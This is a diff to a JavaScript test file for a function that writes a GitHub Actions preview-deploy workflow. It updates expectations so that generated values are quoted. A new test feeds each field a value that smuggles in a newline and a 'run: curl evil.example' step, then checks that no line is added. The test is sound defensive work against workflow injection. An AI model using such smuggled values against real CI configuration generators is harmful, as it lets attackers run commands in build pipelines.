@@ -25,7 +25,7 @@ describe('previewWorkflowText', () => {
 					'      - uses: HarperFast/deploy-action@v1',
 					'        with:',
 					'          target: ${{ vars.HARPER_PREVIEW_TARGET }}',
-					'          app: shop',
+					'          app: "shop"',
 					'          preview: true',
 				].join('\n'),
 			);
@@ -43,19 +43,30 @@ describe('previewWorkflowText', () => {
 
 	it('runs the two jobs in the two environments the trust policies pin', () => {
 		const text = previewWorkflowText({ app: 'shop', branch: 'main' });
-		expect(job(text, 'deploy')).toContain('    environment: preview\n');
-		expect(job(text, 'cleanup')).toContain('    environment: preview-cleanup\n');
+		expect(job(text, 'deploy')).toContain('    environment: "preview"\n');
+		expect(job(text, 'cleanup')).toContain('    environment: "preview-cleanup"\n');
 		const custom = previewWorkflowText({
 			app: 'shop',
 			branch: 'main',
 			environment: 'review',
 			cleanupEnvironment: 'teardown',
 		});
-		expect(job(custom, 'deploy')).toContain('    environment: review\n');
-		expect(job(custom, 'cleanup')).toContain('    environment: teardown\n');
+		expect(job(custom, 'deploy')).toContain('    environment: "review"\n');
+		expect(job(custom, 'cleanup')).toContain('    environment: "teardown"\n');
 	});
 
-	it('quotes the branch', () => {
+	it('quotes every value from the policy, so none can add a line to the file', () => {
+		const lines = previewWorkflowText({ app: 'shop', branch: 'main', domain: 'app.example.com' }).split('\n').length;
+		const step = '\n      - run: curl evil.example';
+		const text = previewWorkflowText({
+			app: `shop${step}`,
+			branch: `main${step}`,
+			environment: `preview${step}`,
+			cleanupEnvironment: `preview-cleanup${step}`,
+			domain: `app.example.com${step}`,
+		});
+		expect(text.split('\n')).toHaveLength(lines);
+		expect(text).toContain(`          domain: ${JSON.stringify(`app.example.com${step}`)}\n`);
 		expect(previewWorkflowText({ app: 'shop', branch: 'release/1.0' })).toContain('branches: ["release/1.0"]');
 	});
 
@@ -71,7 +82,7 @@ describe('previewWorkflowText', () => {
 		});
 		expect(job(text, 'deploy')).toContain(
 			'          preview: true\n'
-				+ '          domain: app.example.com\n'
+				+ '          domain: "app.example.com"\n'
 				+ '          credential: true\n'
 				+ '          branched_databases: false\n',
 		);
